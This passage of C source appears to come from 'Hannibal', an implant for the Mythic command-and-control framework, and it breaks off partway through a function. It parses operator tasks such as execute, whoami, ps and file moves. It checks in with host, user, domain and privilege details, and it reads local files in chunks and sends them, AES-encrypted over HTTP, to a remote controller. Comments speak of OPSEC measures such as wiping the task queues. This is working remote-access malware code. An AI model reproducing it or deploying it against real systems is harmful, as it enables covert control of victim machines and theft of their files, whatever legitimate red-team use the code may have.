                param2_uint32 = ReadUint32(&buffer);
                param2_wstring = ReadStringW(&buffer, param2_uint32);
            }

            task.cmd_id = CMD_MV_MESSAGE;

            task.cmd = (CMD_MV *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CMD_MV), MEM_COMMIT, PAGE_READWRITE);
            if(!task.cmd){
                return NULL;
            }

            mv = (CMD_MV *)task.cmd;
            mv->src_path = param1_wstring;
            mv->dst_path = param2_wstring;
            task.cmd = mv;

            task_enqueue(hannibal_instance_ptr->tasks.tasks_queue, &task);

            break;
#endif // INCLUDE_CMD_MV
#ifdef INCLUDE_CMD_HOSTNAME
        case CMD_HOSTNAME_MESSAGE:

            tlv_type = ReadUint8(&buffer);

            if(tlv_type == TLV_CMD_ID){
                param1_uint32 = ReadUint32(&buffer);
                task.task_uuid = ReadString(&buffer, param1_uint32); // Freed in post_tasks
            }

            task.cmd_id = CMD_HOSTNAME_MESSAGE;

            task.cmd = (CMD_HOSTNAME *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CMD_HOSTNAME), MEM_COMMIT, PAGE_READWRITE);
            if(!task.cmd){
                return NULL;
            }

            hostname = (CMD_HOSTNAME *)task.cmd;
            task.cmd = hostname;

            task_enqueue(hannibal_instance_ptr->tasks.tasks_queue, &task);

            break;
#endif // INCLUDE_CMD_HOSTNAME
#ifdef INCLUDE_CMD_WHOAMI
        case CMD_WHOAMI_MESSAGE:

            tlv_type = ReadUint8(&buffer);

            if(tlv_type == TLV_CMD_ID){
                param1_uint32 = ReadUint32(&buffer);
                task.task_uuid = ReadString(&buffer, param1_uint32); // Freed in post_tasks
            }

            task.cmd_id = CMD_WHOAMI_MESSAGE;

            task.cmd = (CMD_WHOAMI *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CMD_WHOAMI), MEM_COMMIT, PAGE_READWRITE);
            if(!task.cmd){
                return NULL;
            }

            who = (CMD_WHOAMI *)task.cmd;
            task.cmd = who;

            task_enqueue(hannibal_instance_ptr->tasks.tasks_queue, &task);

            break;
#endif // INCLUDE_CMD_WHOAMI
#ifdef INCLUDE_CMD_MKDIR
        case CMD_MKDIR_MESSAGE:

            tlv_type = ReadUint8(&buffer);

            if(tlv_type == TLV_CMD_ID){
                param1_uint32 = ReadUint32(&buffer);
                task.task_uuid = ReadString(&buffer, param1_uint32); // Freed in post_tasks
            }

            tlv_type = ReadUint8(&buffer);

            if(tlv_type == TLV_CMD_MKDIR_PATH){
                param1_uint32 = ReadUint32(&buffer);
                param1_wstring = ReadStringW(&buffer, param1_uint32);
            }

            task.cmd_id = CMD_MKDIR_MESSAGE;

            task.cmd = (CMD_MKDIR *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CMD_MKDIR), MEM_COMMIT, PAGE_READWRITE);
            if(!task.cmd){
                return NULL;
            }

            mk = (CMD_MKDIR *)task.cmd;
            mk->path = param1_wstring;
            task.cmd = mk;

            task_enqueue(hannibal_instance_ptr->tasks.tasks_queue, &task);

            break;
#endif // INCLUDE_CMD_MKDIR
#ifdef INCLUDE_CMD_PS
        case CMD_PS_MESSAGE:

            tlv_type = ReadUint8(&buffer);

            if(tlv_type == TLV_CMD_ID){
                param1_uint32 = ReadUint32(&buffer);
                task.task_uuid = ReadString(&buffer, param1_uint32); // Freed in post_tasks
            }

            task.cmd_id = CMD_PS_MESSAGE;

            task.cmd = (CMD_PS *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CMD_PS), MEM_COMMIT, PAGE_READWRITE);
            if(!task.cmd){
                return NULL;
            }

            ps = (CMD_PS *)task.cmd;
            task.cmd = ps;

            task_enqueue(hannibal_instance_ptr->tasks.tasks_queue, &task);

            break;
#endif // INCLUDE_CMD_PS
#ifdef INCLUDE_CMD_IPINFO      
        case CMD_IPINFO_MESSAGE:

            tlv_type = ReadUint8(&buffer);

            if(tlv_type == TLV_CMD_ID){
                param1_uint32 = ReadUint32(&buffer);
                task.task_uuid = ReadString(&buffer, param1_uint32); // Freed in post_tasks
            }

            task.cmd_id = CMD_IPINFO_MESSAGE;

            task.cmd = (CMD_IPINFO *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CMD_IPINFO), MEM_COMMIT, PAGE_READWRITE);
            if(!task.cmd){
                return NULL;
            }

            ip = (CMD_IPINFO *)task.cmd;
            task.cmd = ip;

            task_enqueue(hannibal_instance_ptr->tasks.tasks_queue, &task);

            break;
#endif // INCLUDE_CMD_IPINFO
#ifdef INCLUDE_CMD_LISTDRIVES
        case CMD_LISTDRIVES_MESSAGE:

            tlv_type = ReadUint8(&buffer);

            if(tlv_type == TLV_CMD_ID){
                param1_uint32 = ReadUint32(&buffer);
                task.task_uuid = ReadString(&buffer, param1_uint32); // Freed in post_tasks
            }

            task.cmd_id = CMD_LISTDRIVES_MESSAGE;

            task.cmd = (CMD_LISTDRIVES *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CMD_LISTDRIVES), MEM_COMMIT, PAGE_READWRITE);
            if(!task.cmd){
                return NULL;
            }

            ld = (CMD_LISTDRIVES *)task.cmd;
            task.cmd = ld;

            task_enqueue(hannibal_instance_ptr->tasks.tasks_queue, &task);

            break;
#endif // INCLUDE_CMD_LISTDRIVES
#ifdef INCLUDE_CMD_EXECUTE
        case CMD_EXECUTE_MESSAGE:

            tlv_type = ReadUint8(&buffer);

            if(tlv_type == TLV_CMD_ID){
                param1_uint32 = ReadUint32(&buffer);
                task.task_uuid = ReadString(&buffer, param1_uint32); // Freed in post_tasks
            }

            tlv_type = ReadUint8(&buffer);

            if(tlv_type == TLV_CMD_EXECUTE_PATH){
                param1_uint32 = ReadUint32(&buffer);
                param1_wstring = ReadStringW(&buffer, param1_uint32);
            }

            task.cmd_id = CMD_EXECUTE_MESSAGE;

            task.cmd = (CMD_EXECUTE *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CMD_EXECUTE), MEM_COMMIT, PAGE_READWRITE);
            if(!task.cmd){
                return NULL;
            }

            exec = (CMD_EXECUTE *)task.cmd;
            exec->path = param1_wstring;
            task.cmd = exec;

            task_enqueue(hannibal_instance_ptr->tasks.tasks_queue, &task);

            break;
#endif // INCLUDE_CMD_EXECUTE
#ifdef INCLUDE_CMD_SLEEP
        case CMD_SLEEP_MESSAGE:

            tlv_type = ReadUint8(&buffer);

            if(tlv_type == TLV_CMD_ID){
                param1_uint32 = ReadUint32(&buffer);
                task.task_uuid = ReadString(&buffer, param1_uint32); // Freed in post_tasks
            }

            tlv_type = ReadUint8(&buffer);

            if(tlv_type == TLV_CMD_SLEEP_INTERVAL){
                param1_uint32 = ReadUint32(&buffer); // Not used
                param1_uint32 = ReadUint32(&buffer);
            }

            tlv_type = ReadUint8(&buffer);

            if(tlv_type == TLV_CMD_SLEEP_JITTER){
                param2_uint32 = ReadUint32(&buffer); // Not used
                param2_uint32 = ReadUint32(&buffer);
            }

            task.cmd_id = CMD_SLEEP_MESSAGE;

            task.cmd = (CMD_SLEEP *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CMD_SLEEP), MEM_COMMIT, PAGE_READWRITE);
            if(!task.cmd){
                return NULL;
            }

            sleep = (CMD_SLEEP *)task.cmd;
            sleep->interval = param1_uint32;
            sleep->jitter = param2_uint32;
            task.cmd = sleep;

            task_enqueue(hannibal_instance_ptr->tasks.tasks_queue, &task);

            break;
#endif // INCLUDE_CMD_SLEEP
#ifdef INCLUDE_CMD_AGENTINFO
        case CMD_AGENTINFO_MESSAGE:

            tlv_type = ReadUint8(&buffer);

            if(tlv_type == TLV_CMD_ID){
                param1_uint32 = ReadUint32(&buffer);
                task.task_uuid = ReadString(&buffer, param1_uint32); // Freed in post_tasks
            }

            task.cmd_id = CMD_AGENTINFO_MESSAGE;

            task.cmd = (CMD_AGENTINFO *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CMD_AGENTINFO), MEM_COMMIT, PAGE_READWRITE);
            if(!task.cmd){
                return NULL;
            }

            info = (CMD_AGENTINFO *)task.cmd;
            task.cmd = info;

            task_enqueue(hannibal_instance_ptr->tasks.tasks_queue, &task);

            break;
#endif // INCLUDE_CMD_AGENTINFO
        default:
            break;
        } // switch(cmd)
        
    } // for each task
}

SECTION_CODE SERIALIZE_POST_TASKS_INFO serialize_post_tasks(UINT8 *buffer, int buffer_size, LPCSTR task_uuid)
{
    HANNIBAL_INSTANCE_PTR

    int BUFFER_SIZE = 0;
    // BUFFER_SIZE += pic_strlen(hannibal_instance_ptr->config.uuid); // Outer UUID
    BUFFER_SIZE += sizeof(UINT8); // Message Type
    BUFFER_SIZE += sizeof(UINT8) + sizeof(UINT32) + sizeof(UINT32); // POST Tasks TLV
    BUFFER_SIZE += sizeof(UINT8) + sizeof(UINT32) + pic_strlen(task_uuid); // Task GUID TLV
    BUFFER_SIZE += sizeof(UINT8) + sizeof(UINT32) + buffer_size; // Task Content TLV

    UINT8 *content_buffer = (UINT8 *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, BUFFER_SIZE, MEM_COMMIT, PAGE_READWRITE);

    UINT8 *buffer_cursor = content_buffer;

    // Outer UUID
    // WriteString(&buffer_cursor, hannibal_instance_ptr->config.uuid, FALSE);

    // Message Type
    WriteUint8(&buffer_cursor, MESSAGE_TYPE_POST_TASKS);

    // Post Tasks TLV
    WriteUint8(&buffer_cursor, TLV_POST_TASKING);
    WriteUint32(&buffer_cursor, sizeof(UINT32)),  // For now we aren't actually using this. One response per POST vs all at once.
    WriteUint32(&buffer_cursor, hannibal_instance_ptr->tasks.tasks_response_queue->size);

    // Task GUID TLV
    WriteUint8(&buffer_cursor, TLV_POST_TASKING_ID);
    WriteUint32(&buffer_cursor, pic_strlen(task_uuid));
    WriteString(&buffer_cursor, task_uuid, FALSE);

    // Task Response Content
    WriteUint8(&buffer_cursor, TLV_POST_TASKING_CONTENT);
    WriteUint32(&buffer_cursor, buffer_size);
    WriteBytes(&buffer_cursor, buffer, buffer_size);

    hannibal_instance_ptr->Win32.VirtualFree(buffer, 0, MEM_RELEASE);

    SERIALIZE_POST_TASKS_INFO ret;
    ret.buffer = content_buffer;
    ret.buffer_size = BUFFER_SIZE;

    return ret;

}


SECTION_CODE UINT8 deserialize_post_tasks_response(char *buffer)
{
    HANNIBAL_INSTANCE_PTR

    UINT8 message_type = ReadUint8(&buffer);

    if(message_type != MESSAGE_TYPE_POST_TASKS_RESPONSE){
        return NULL;
    }

    UINT8 result = ReadUint8(&buffer);

    return result;
}



//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/**
 * Core Functions for Mythic HTTP Profile
*/

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////





////////////////////////////////////////////////////////////////// CHECKIN



/**
 * Would suggest lowering the amount of API calls hit on checkin
 * for OPSEC reasons. TODO: There is repeated code that is also in cmds.
 */

SECTION_CODE void mythic_http_checkin()
{
    HANNIBAL_INSTANCE_PTR

    // Current Process
    WCHAR process_nameW[MAX_PATH] = L"<unknown>";
    hannibal_instance_ptr->Win32.GetModuleFileNameW(NULL, process_nameW, sizeof(process_nameW));

    // Current Hostname
    WCHAR hostnameW[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    // DWORD size = sizeof(hostnameW) / sizeof(hostnameW[0]);
    DWORD size = sizeof(hostnameW);

    hannibal_instance_ptr->Win32.GetComputerNameExW(ComputerNameNetBIOS, hostnameW, &size);

    // Domain + Username

    WCHAR name[256];
    WCHAR domain[256];
    DWORD integrity_level = 0;

    HANDLE hToken;
    if(hannibal_instance_ptr->Win32.OpenProcessToken(-1, TOKEN_QUERY, &hToken)){
       
        DWORD dwSize = 0;
       
        hannibal_instance_ptr->Win32.GetTokenInformation(hToken, TokenUser, 0, 0, &dwSize);
       
        BYTE buffer[dwSize];
        PTOKEN_USER pTokenUser = (PTOKEN_USER)buffer;

        if (hannibal_instance_ptr->Win32.GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize)){
            DWORD name_size = sizeof(name);
            DWORD domain_size = sizeof(domain);
            SID_NAME_USE sid_type;
            
            hannibal_instance_ptr->Win32.LookupAccountSidW(NULL, pTokenUser->User.Sid, name, &name_size, domain, &domain_size, &sid_type);

        }

        DWORD dwLength = 0;
        hannibal_instance_ptr->Win32.GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &dwLength);

        TOKEN_MANDATORY_LABEL* pLabel = (TOKEN_MANDATORY_LABEL *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, dwLength, MEM_COMMIT, PAGE_READWRITE);

         if (pLabel != NULL) {
                            
            if (hannibal_instance_ptr->Win32.GetTokenInformation(hToken, TokenIntegrityLevel, pLabel, dwLength, &dwLength)) {
                DWORD integrity_value = *hannibal_instance_ptr->Win32.GetSidSubAuthority(pLabel->Label.Sid, 0);
                if (integrity_value == SECURITY_MANDATORY_LOW_RID) {
                    integrity_level = 1;
                } else if (integrity_value >= SECURITY_MANDATORY_MEDIUM_RID && integrity_value < SECURITY_MANDATORY_HIGH_RID) {
                    integrity_level = 2;
                } else if (integrity_value >= SECURITY_MANDATORY_HIGH_RID && integrity_value < SECURITY_MANDATORY_SYSTEM_RID) {
                    integrity_level = 3;
                } else if (integrity_value >= SECURITY_MANDATORY_SYSTEM_RID) {
                    integrity_level = 4;
                } else {
                    integrity_level = 0;
                }
            } else {
                integrity_level = 0;
            }
        
            hannibal_instance_ptr->Win32.VirtualFree(pLabel, 0, MEM_RELEASE);
        } 
    }

    ///////////////////////////////////////////////////////////// Create Checkin Message 

    // WCHAR *ip_addr[2] = {L"192.168.10.10", L"192.168.20.20"}; // Match .ips_count with how many
    // WCHAR *ip_addr[1] = {L"192.168.10.10"}; 

    CheckinMessage tlv_checkin_msg = {
        .action = 1,
        .uuid = hannibal_instance_ptr->config.uuid,
        // .ips = ip_addr,
        // .ips_count = 2,
        // .os = L"Windows 11",
        .user = name,
        .host = hostnameW,
        .pid = hannibal_instance_ptr->Win32.GetCurrentProcessId(),
        // .architecture = L"x64",
        .domain = domain,
        .integrity_level = integrity_level,
        // .external_ip = L"55.55.55.55",
        // .encryption_key = "asdasdasdasdasdasdasd",
        // .decryption_key = "asdasdasdasdasdasdasd",
        .process_name = process_nameW,

    };

    UINT32 serialized_buffer_size;
    uint8_t *serialized_buffer = serialize_checkin(&tlv_checkin_msg, &serialized_buffer_size); // Freed in encryption function


    ///////////////////////////////////////////////////////////// Encrypt checkin content

    MYTHIC_HTTP_ENCRYPTION_MSG enc_resp = mythic_http_aes_encrypt(serialized_buffer, serialized_buffer_size);


    ///////////////////////////////////////////////////////////// Send to Mythic

    to_utility_http_wininet_msg send_msg;

    send_msg.dst_host = hannibal_instance_ptr->config.controller_host;
    send_msg.dst_url = hannibal_instance_ptr->config.controller_url;
    send_msg.http_method = hannibal_instance_ptr->config.http_method;
    send_msg.user_agent = hannibal_instance_ptr->config.user_agent;
    send_msg.content = enc_resp.buffer; 
    send_msg.content_length = enc_resp.buffer_size;

    from_utility_http_wininet_msg checkin_response = http_wininet_request(send_msg);

    hannibal_instance_ptr->Win32.VirtualFree(serialized_buffer, 0, MEM_RELEASE);
    hannibal_instance_ptr->Win32.VirtualFree(send_msg.content, 0, MEM_RELEASE);


    ///////////////////////////////////////////////////////////// Parse Checkin Response

    // If unable to reach controller hannibal.c loops
    if(checkin_response.content == NULL){
        return;
    }

    int resp_strlen = pic_strlen(checkin_response.content);

    // If abnormal response
    if(resp_strlen < 108){
        return;
    }


    ///////////////////////////////////////////////////////////// Decrypt Response and Check Message Integrity

    MYTHIC_HTTP_ENCRYPTION_MSG dec_resp = mythic_http_aes_decrypt(checkin_response.content, resp_strlen);

    // If message corrupted/tampered with/other error
    if(dec_resp.buffer == NULL){
        hannibal_instance_ptr->Win32.VirtualFree(dec_resp.buffer, 0, MEM_RELEASE);
        hannibal_instance_ptr->Win32.VirtualFree(checkin_response.content, 0, MEM_RELEASE);
        return;
    }

    CheckinMessageResponse *resp = deserialize_checkin_reponse(dec_resp.buffer);
    
    if(resp != NULL){
        if (resp->status){
            if(resp->uuid){
                hannibal_instance_ptr->config.checked_in = TRUE;
                hannibal_instance_ptr->config.uuid = resp->uuid;
            }
        }
    }

    hannibal_instance_ptr->Win32.VirtualFree(resp, 0, MEM_RELEASE);
    hannibal_instance_ptr->Win32.VirtualFree(dec_resp.buffer, 0, MEM_RELEASE);
    hannibal_instance_ptr->Win32.VirtualFree(checkin_response.content, 0, MEM_RELEASE);

}




////////////////////////////////////////////////////////////////// GET TASKING





SECTION_CODE void mythic_http_get_tasks()
{
    HANNIBAL_INSTANCE_PTR

    GetTasksMessage tlv_get_tasks_msg = {
        .action = MESSAGE_TYPE_GET_TASKS,
        .tasking_size = 0, // Mythic says -1 for all tasks but to save space we'll say it's zero.
        .get_delegate_tasks = 0 
    };

    UINT32 serialized_buffer_size;
    UINT8* serialized_buffer = serialize_get_tasking_msg(&tlv_get_tasks_msg, &serialized_buffer_size);

    MYTHIC_HTTP_ENCRYPTION_MSG enc_resp = mythic_http_aes_encrypt(serialized_buffer, serialized_buffer_size);


    to_utility_http_wininet_msg send_msg;

    send_msg.dst_host = hannibal_instance_ptr->config.controller_host;
    send_msg.dst_url = hannibal_instance_ptr->config.controller_url;
    send_msg.http_method = hannibal_instance_ptr->config.http_method;
    send_msg.user_agent = hannibal_instance_ptr->config.user_agent;
    send_msg.content = enc_resp.buffer; 
    send_msg.content_length = enc_resp.buffer_size;

    from_utility_http_wininet_msg get_tasks_response = http_wininet_request(send_msg);

    hannibal_instance_ptr->Win32.VirtualFree(serialized_buffer, 0, MEM_RELEASE);
    hannibal_instance_ptr->Win32.VirtualFree(enc_resp.buffer, 0, MEM_RELEASE);
    hannibal_instance_ptr->Win32.VirtualFree(send_msg.content, 0, MEM_RELEASE);

    ///////////////////////////////////////////////////////////// Parse response

    // If can't connect to controller
    if(get_tasks_response.content == NULL){
        return;
    }

    int resp_strlen = pic_strlen(get_tasks_response.content);

    MYTHIC_HTTP_ENCRYPTION_MSG dec_resp = mythic_http_aes_decrypt(get_tasks_response.content, resp_strlen);

    // If message corrupted/tampered with/other error
    if(dec_resp.buffer == NULL){
        return;
    }

    if (dec_resp.buffer[0] != 0){ // Has tasks
        char *buffer_copy = dec_resp.buffer;
        deserialize_get_tasks_response(buffer_copy);
    }

    hannibal_instance_ptr->Win32.VirtualFree(dec_resp.buffer, 0, MEM_RELEASE);

}





////////////////////////////////////////////////////////////////// POST TASKING



/**
 * @brief Sends each task response in its own HTTP response.
 * 
 * Instead of sending every task's response in a single POST
 * send one POST per response. This also enables us to add size
 * restrictions per response in the future.
 * 
 * @return void
 */

SECTION_CODE void mythic_http_post_tasks()
{
    HANNIBAL_INSTANCE_PTR

    // TODO: Add way to check that we can connect to controller before
    // dequeing a task. So task responses aren't lost.

#ifdef INCLUDE_CMD_DOWNLOAD
    if(hannibal_instance_ptr->tasks.download_count > 0){
        mythic_http_continue_file_downloads();
    }
#endif

#ifdef INCLUDE_CMD_UPLOAD
    if(hannibal_instance_ptr->tasks.upload_count > 0){
        mythic_http_continue_file_uploads();
    }
#endif

    for (int i = hannibal_instance_ptr->tasks.tasks_response_queue->size; i > 0; i--){

        TASK post_task;
        task_dequeue(hannibal_instance_ptr->tasks.tasks_response_queue, &post_task);

        SERIALIZE_POST_TASKS_INFO pt = serialize_post_tasks(post_task.output, post_task.output_size, post_task.task_uuid);

        hannibal_instance_ptr->Win32.VirtualFree(post_task.output, 0, MEM_RELEASE);
        hannibal_instance_ptr->Win32.VirtualFree(post_task.task_uuid, 0, MEM_RELEASE);


        MYTHIC_HTTP_ENCRYPTION_MSG enc_resp = mythic_http_aes_encrypt(pt.buffer, pt.buffer_size);


        to_utility_http_wininet_msg send_msg;

        send_msg.dst_host = hannibal_instance_ptr->config.controller_host;
        send_msg.dst_url = hannibal_instance_ptr->config.controller_url;
        send_msg.http_method = hannibal_instance_ptr->config.http_method;
        send_msg.user_agent = hannibal_instance_ptr->config.user_agent;
        send_msg.content = enc_resp.buffer; 
        send_msg.content_length = enc_resp.buffer_size;
        

        from_utility_http_wininet_msg post_tasks_response = http_wininet_request(send_msg);

        // TODO: Parse response and if it did not succeed, requeue the task response to try again.

        hannibal_instance_ptr->Win32.VirtualFree(pt.buffer, 0, MEM_RELEASE);
        hannibal_instance_ptr->Win32.VirtualFree(enc_resp.buffer, 0, MEM_RELEASE);
        hannibal_instance_ptr->Win32.VirtualFree(send_msg.content, 0, MEM_RELEASE);
        hannibal_instance_ptr->Win32.VirtualFree(post_tasks_response.content, 0, MEM_RELEASE);

    }


    // Zero out the queues for better OPSEC.
    if (hannibal_instance_ptr->tasks.tasks_queue->size == 0){
        for (int i = 0; i < TASK_CIRCULAR_QUEUE_SIZE; i++){
            hannibal_instance_ptr->tasks.tasks_queue->queue_ptr[i] = (TASK){
                .task_uuid = 0,
                .cmd_id = 0,
                .timestamp = 0,
                .cmd = 0,
                .output = 0,
                .output_size = 0
            };
        }
    }
    if (hannibal_instance_ptr->tasks.tasks_response_queue->size == 0){
        for (int i = 0; i < TASK_RESPONSE_CIRCULAR_QUEUE_SIZE; i++){
            hannibal_instance_ptr->tasks.tasks_response_queue->queue_ptr[i] = (TASK){
                .task_uuid = 0,
                .cmd_id = 0,
                .timestamp = 0,
                .cmd = 0,
                .output = 0,
                .output_size = 0
            };
        }
    }
}



////////////////////////////////////////////////////////////////// Download Files Agent > Mythic

/**
 * @brief Mythic HTTP specific command for downloading files from agent to Mythic.
 * 
 * https://docs.mythic-c2.net/customizing/hooking-features/download
 * Due to how Mythic handles file downloads this
 * was implemented here instead of as a command.
 * It utilizes the file_downloads queue instead of
 * tasking like commands do.
 * 
 * Incoming messages from Mythic are passed in direct
 * as FILE_DOWNLOAD structs. Outgoing responses go direct
 * to Mythic.
 * 
 * TODO: Reduce repeated code. Investigate odd memory allocation behaviour, potential leak. 
 *       Maybe use _CRTDBG_LEAK_CHECK_DF.
 * 
 * @param[in] download A heap allocated struct that has its contents copied in the download queue.
 * 
 * @return void
 */
#ifdef INCLUDE_CMD_DOWNLOAD

SECTION_CODE void mythic_http_start_file_download(FILE_DOWNLOAD *download)
{
    HANNIBAL_INSTANCE_PTR

    if (hannibal_instance_ptr->tasks.download_count >= CONCURRENT_FILE_DOWNLOADS){

        hannibal_response(L"Exceeded queue limit.", download->task_uuid);
        hannibal_instance_ptr->Win32.VirtualFree(download->path, 0, MEM_RELEASE);
        hannibal_instance_ptr->Win32.VirtualFree(download, 0, MEM_RELEASE);

        return;
    }

    HANDLE hFile = hannibal_instance_ptr->Win32.CreateFileW(download->path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        DWORD error_code = hannibal_instance_ptr->Win32.GetLastError();

        WCHAR error_codeW[20];
        WCHAR error_messageW[256] = L"Error Code: ";

        dword_to_wchar(error_code, error_codeW, 10);
        pic_strcatW(error_messageW, error_codeW);

        hannibal_response(error_messageW, download->task_uuid);

        hannibal_instance_ptr->Win32.VirtualFree(download->path, 0, MEM_RELEASE);
        hannibal_instance_ptr->Win32.VirtualFree(download, 0, MEM_RELEASE);

        return;
    }


    LARGE_INTEGER file_size;
    hannibal_instance_ptr->Win32.GetFileSizeEx(hFile, &file_size);

    int chunk_count = (int)((file_size.QuadPart + FILE_DOWNLOAD_CHUNK_SIZE - 1) / FILE_DOWNLOAD_CHUNK_SIZE);

    // Signal start of file download to Mythic

    int BUFFER_SIZE = 0;
    // int BUFFER_SIZE = pic_strlen(hannibal_instance_ptr->config.uuid); // Agent UUID
    BUFFER_SIZE += sizeof(UINT8); // Message Type
    BUFFER_SIZE += sizeof(UINT8) + sizeof(UINT32) + pic_strlen(download->task_uuid); // Task UUID
    BUFFER_SIZE += sizeof(UINT8) + sizeof(UINT32) + sizeof(UINT32); // Chunk Count TLV
    BUFFER_SIZE += sizeof(UINT8) + sizeof(UINT32) + sizeof(UINT64); // Chunk size
    BUFFER_SIZE += sizeof(UINT8) + sizeof(UINT32) + pic_strlenW(download->path)*sizeof(WCHAR); // Filepath TLV

    int serialized_buffer_size = BUFFER_SIZE;
    // Freed in mythic_http_start_file_download()
    char *serialized_buffer = (char *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, BUFFER_SIZE, MEM_COMMIT, PAGE_READWRITE);

    UINT8 *buffer_cursor = serialized_buffer;

     // UUID For Mythic
    // WriteString(&buffer_cursor, hannibal_instance_ptr->config.uuid, FALSE);

    // What kind of message is this
    WriteUint8(&buffer_cursor, MESSAGE_TYPE_START_DOWNLOAD);

    // TASK GUID TLV
    WriteUint8(&buffer_cursor, TLV_POST_TASKING_ID);
    WriteUint32(&buffer_cursor, pic_strlen(download->task_uuid));
    WriteString(&buffer_cursor, download->task_uuid, FALSE);

    // Chunk Count TLV
    WriteUint8(&buffer_cursor, TLV_START_DOWNLOAD_CHUNK_COUNT);
    WriteUint32(&buffer_cursor, sizeof(UINT32));
    WriteUint32(&buffer_cursor, chunk_count);

    // Filesize - Not used as Mythic doesn't support
    // WriteUint8(&buffer_cursor, TLV_START_DOWNLOAD_FILESIZE);
    // WriteUint32(&buffer_cursor, sizeof(UINT64));
    // WriteUint64(&buffer_cursor, file_size.QuadPart);

    // Chunk size
    WriteUint8(&buffer_cursor, TLV_START_DOWNLOAD_CHUNK_SIZE);
    WriteUint32(&buffer_cursor, sizeof(UINT32));
    WriteUint32(&buffer_cursor, FILE_DOWNLOAD_CHUNK_SIZE);


    // Filepath TLV
    WriteUint8(&buffer_cursor, TLV_START_DOWNLOAD_FILEPATH);
    WriteUint32(&buffer_cursor, pic_strlenW(download->path)*sizeof(WCHAR));
    WriteStringW(&buffer_cursor, download->path, FALSE);


    MYTHIC_HTTP_ENCRYPTION_MSG enc_resp = mythic_http_aes_encrypt(serialized_buffer, serialized_buffer_size);

    to_utility_http_wininet_msg send_msg;

    send_msg.dst_host = hannibal_instance_ptr->config.controller_host;
    send_msg.dst_url = hannibal_instance_ptr->config.controller_url;
    send_msg.http_method = hannibal_instance_ptr->config.http_method;
    send_msg.user_agent = hannibal_instance_ptr->config.user_agent;
    send_msg.content = enc_resp.buffer; 
    send_msg.content_length = enc_resp.buffer_size;

    from_utility_http_wininet_msg init_download_response = http_wininet_request(send_msg);

    hannibal_instance_ptr->Win32.VirtualFree(download->task_uuid, 0, MEM_RELEASE);
    hannibal_instance_ptr->Win32.VirtualFree(serialized_buffer, 0, MEM_RELEASE);
    hannibal_instance_ptr->Win32.VirtualFree(send_msg.content, 0, MEM_RELEASE);
    hannibal_instance_ptr->Win32.CloseHandle(hFile);

    /////////////////////////// PARSE INIT DOWNLOAD RESPONSE

    // If can't connect to controller
    if(init_download_response.content == NULL){
        return;
    }

    int resp_strlen = pic_strlen(init_download_response.content);


    MYTHIC_HTTP_ENCRYPTION_MSG dec_resp = mythic_http_aes_decrypt(init_download_response.content, resp_strlen);

    // If message corrupted/tampered with/other error
    if(dec_resp.buffer == NULL){
        return;
    }

    char *init_download_msg = dec_resp.buffer;

    int message_type = ReadUint8(&init_download_msg);

    int success = ReadUint8(&init_download_msg);

    // Freed in mythic_http_continue_file_downloads() at EOF
    char *file_id = ReadString(&init_download_msg, 37); // Should use TLVs instead but don't like wasting bandwidth
    char *task_id = ReadString(&init_download_msg, 37);

    hannibal_instance_ptr->tasks.download_count += 1;

    download->task_uuid = task_id;
    download->download_uuid = file_id;
    download->filesize = file_size.QuadPart;
    download->chunk_count = chunk_count;

    // Queue the download. This copies the data from the download struct. So freeing download is fine.
    hannibal_instance_ptr->tasks.file_downloads[hannibal_instance_ptr->tasks.download_count - 1] = *download;

    hannibal_instance_ptr->Win32.VirtualFree(dec_resp.buffer, 0, MEM_RELEASE);
    hannibal_instance_ptr->Win32.VirtualFree(download, 0, MEM_RELEASE);

}

/**
 * @brief Loops through all queued downloads and sends the next chunk.
 * 
 * Called in mythic_http_post_tasks()
 * Each time the agent wakes up and sends task responses
 * all the queued downloads will send their next chunks.
 * 
 * TODO: Reduce repeated code. Investigate odd memory allocation behaviour, potential leak. 
 *       Maybe use _CRTDBG_LEAK_CHECK_DF.
 * 
 * @return void
 */
SECTION_CODE void mythic_http_continue_file_downloads()
{
    HANNIBAL_INSTANCE_PTR

    for(int i = 0; i < hannibal_instance_ptr->tasks.download_count; i++){
        if (hannibal_instance_ptr->tasks.file_downloads[i].download_uuid != NULL){

           
            // TODO: Check invalid handle or permission error
            HANDLE hFile = hannibal_instance_ptr->Win32.CreateFileW(hannibal_instance_ptr->tasks.file_downloads[i].path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

            hannibal_instance_ptr->Win32.SetFilePointer(hFile, hannibal_instance_ptr->tasks.file_downloads[i].bytes_sent, NULL, FILE_BEGIN);

            // Freed in mythic_http_continue_file_downloads()
            char *chunk_buffer = (char *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, FILE_DOWNLOAD_CHUNK_SIZE, MEM_COMMIT, PAGE_READWRITE);

            DWORD bytes_read;
            hannibal_instance_ptr->Win32.ReadFile(hFile, chunk_buffer, FILE_DOWNLOAD_CHUNK_SIZE, &bytes_read, NULL);


            if (bytes_read < FILE_DOWNLOAD_CHUNK_SIZE){
                int hold = 0;
            }
            // Send chunk back

            int BUFFER_SIZE = 0;
            // int BUFFER_SIZE = pic_strlen(hannibal_instance_ptr->config.uuid); // Agent UUID
            BUFFER_SIZE += sizeof(UINT8); // Message Type
